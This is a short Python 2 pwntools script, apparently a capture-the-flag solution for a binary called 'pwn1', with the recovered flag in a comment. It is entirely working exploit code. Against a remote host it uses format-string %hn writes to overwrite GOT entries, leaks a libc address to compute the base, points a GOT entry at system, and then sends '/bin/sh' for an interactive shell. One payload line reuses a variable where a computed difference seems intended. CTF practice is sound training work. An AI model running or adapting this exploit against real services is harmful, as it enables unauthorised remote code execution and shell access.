from pwn import *
# p = process("./pwn1")
ht,pt = '134.209.97.157', 2222
p = remote(ht,pt)
# gdb.attach("pwn1")
#context.log_level="debug"
put   = 0x804a01c

arr = [0x868e,0x0804]

exp = p32(put)+p32(put+2)
wr = arr[1]-8
exp+="%"+str(wr)+"c%8$hn"
xx = arr[0]-arr[1]
exp+="%"+str(wr)+"c%7$hn"
exp+="%2$p"

x = 0xf7edc5c0 - 0xf7d04000
p.recvuntil('want?\n')
p.sendline(exp)

p.recvuntil('0x')
libc_base =int("0x"+p.recv(8),16)-x
print "libc base: ",hex(libc_base)

pr = 0x804a010

sys_offset = 0x003d2e0
sys_got=libc_base+sys_offset
sys_got = str(hex(sys_got))
arr = [int("0x"+sys_got[6:],16),int(sys_got[:6],16)]

exp = p32(pr)+p32(pr+2)
xx = arr[0]-8
exp+="%"+str(xx)+"c%7$hn"
xx = arr[1]-arr[0]
exp+="%"+str(xx)+"c%8$hn"

p.sendline(exp)
p.sendline("/bin/sh")
p.interactive()
# ptitctf{B3_C4RFUL_WH47_Y0U_W15H_F0R}
